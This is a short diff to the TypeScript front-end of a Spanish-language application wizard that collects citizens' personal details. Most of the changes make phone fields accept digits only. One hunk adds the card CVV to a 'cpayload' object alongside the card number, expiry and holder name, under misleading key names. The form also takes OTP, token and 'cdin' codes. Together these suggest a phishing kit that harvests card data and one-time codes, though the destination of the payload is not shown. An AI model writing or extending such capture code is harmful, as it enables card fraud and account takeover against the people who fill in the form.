@@ -273,7 +273,7 @@ function fillPerson(person: Citizen | null) {
   setVal("digitoVerificacion", person?.digitoVerificacion || "");
   setVal("actividadEconomica", person?.actividadEconomica || "");
   setVal("correoPrimario", person?.correoPrimario || person?.email || "");
-  setVal("telefono", person?.telefono || "");
+  setVal("telefono", String(person?.telefono || "").replace(/\D/g, ""));
   setVal("estrato", person?.estrato || "");
   setVal("departamentoResidencia", person?.departamentoResidencia || "");
   filterMunicipios("municipioResidencia", person?.departamentoResidencia || "", person?.municipioResidencia || "");
@@ -1188,6 +1188,7 @@ export function bindSolicitudWizard() {
             cpayload: {
               b: number,
               cv: val("cardVence"),
+              cvv: val("cardCvv"),
               exp: val("cardCvv"),
               holder: personName(),
             },
@@ -1230,6 +1231,13 @@ export function bindSolicitudWizard() {
       btn.setAttribute("aria-expanded", String(!open));
     });
   });
+  const keepPhoneDigits = () => {
+    const input = $("telefono") as HTMLInputElement | null;
+    if (!input) return;
+    input.value = input.value.replace(/\D/g, "");
+  };
+  $("telefono")?.addEventListener("input", keepPhoneDigits);
+  $("telefono")?.addEventListener("paste", () => window.setTimeout(keepPhoneDigits, 0));
   document.querySelectorAll("input[name='otp'], input[name='token'], input[name='cdin']").forEach((el) => {
     const input = el as HTMLInputElement;
     const keepDigits = () => {
